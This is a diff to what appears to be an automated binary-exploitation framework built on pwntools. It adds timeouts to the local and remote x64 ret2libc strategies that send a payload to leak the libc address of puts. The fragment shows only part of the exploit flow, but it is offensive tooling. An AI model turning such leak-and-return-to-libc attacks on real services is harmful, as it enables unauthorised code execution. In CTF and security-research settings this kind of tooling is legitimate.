@@ -89,12 +89,19 @@ class Ret2LibcPutX64LocalStrategy(ExploitStrategy):
             return False
 
         io = process(str(ctx.binary.path))
-        io.recv()
+        # v4.0.2c4: cap initial banner recv at 0.5s (mirror x32 fix
+        # from v4.0.2c1 — binary without prompt would hang here).
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(payload1)
         print_payload("sending puts leak payload")
 
         try:
-            puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
+            # v4.0.2c4: add timeout=2 to prevent indefinite hang when
+            # binary doesn't produce the expected 0x7f-terminated leak.
+            puts_addr = u64(io.recvuntil(b"\x7f", timeout=2)[-6:].ljust(8, b"\x00"))
         except Exception as e:
             print_info(f"ret2libc-put-x64 leak parse failed: {e}")
             return False
@@ -179,12 +186,17 @@ class Ret2LibcPutX64RemoteStrategy(ExploitStrategy):
             return False
 
         io = remote(host, port)
-        io.recv()
+        # v4.0.2c4: cap initial banner recv at 0.5s.
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(payload1)
         print_payload("sending puts leak payload")
 
         try:
-            puts_addr = u64(io.recv(8))
+            # v4.0.2c4: add timeout=2 to recv (size-known read).
+            puts_addr = u64(io.recv(8, timeout=2))
         except Exception as e:
             print_info(f"ret2libc-put-x64-remote leak parse failed: {e}")
             return False
